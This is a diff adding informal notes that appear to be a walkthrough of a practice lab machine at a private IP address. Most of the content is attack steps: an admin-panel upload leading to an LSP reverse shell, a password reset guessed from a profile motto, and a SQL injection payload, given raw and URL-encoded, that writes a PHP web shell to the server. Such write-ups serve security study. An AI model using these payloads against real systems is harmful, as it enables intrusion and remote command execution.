@@ -1,0 +1,65 @@
+Unintended way (port 33033, 44330):
+
+http://192.168.68.127:8000 -> create administrator -> home page -> menu -> administrator panel (navigate to 44330 ssl site) -> customize server -> upload images to cmsdocs
+
+we realise that we can navigate through the various directories and choose where we can upload our files
+
+we realise that /cmsdocs directory is the base directory for the 44330 webserver
+
+https://192.168.68.127:44330/flower.txt (proof)
+
+we also realise that the server is using lsp lua server pages
+
+https://192.168.68.127:44330/rtl/protected/admin/customize.lsp
+
+https://github.com/the-emmon/lsp-reverse-shell
+
+afterwhich, you got it, instant root lol
+
+nmapAutomator full scan lol..., always do your own full manual scan as well...
+
+
+
+
+
+
+By right way:
+
+/phpinfo -> find path of base directories of webservers on host (port 45332, 45443)
+
+remember to not skip your web enumeration... perform gobuster (and everything else) on everything!
+
+
+move on port 33033
+
+enumerate information of people on website
+
+
+Jerren Valon
+
+Only the paranoid survive.
+
+jerren.devops@company.com
+
+
+attempt to reset jerren's password, reminder word: paranoid
+
+
+request profile slug -> attempt to crash it with special chars
+
+sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
+ret = ActiveRecord::Base.connection.execute(sql)
+
+https://shahjerry33.medium.com/sql-injection-remote-code-execution-double-p1-6038ca88a2ec
+
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
+
+%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
+
+can replace htdocs to apache, should work fine
+
+
+
+priv esc:
+
+https://www.exploit-db.com/exploits/48789
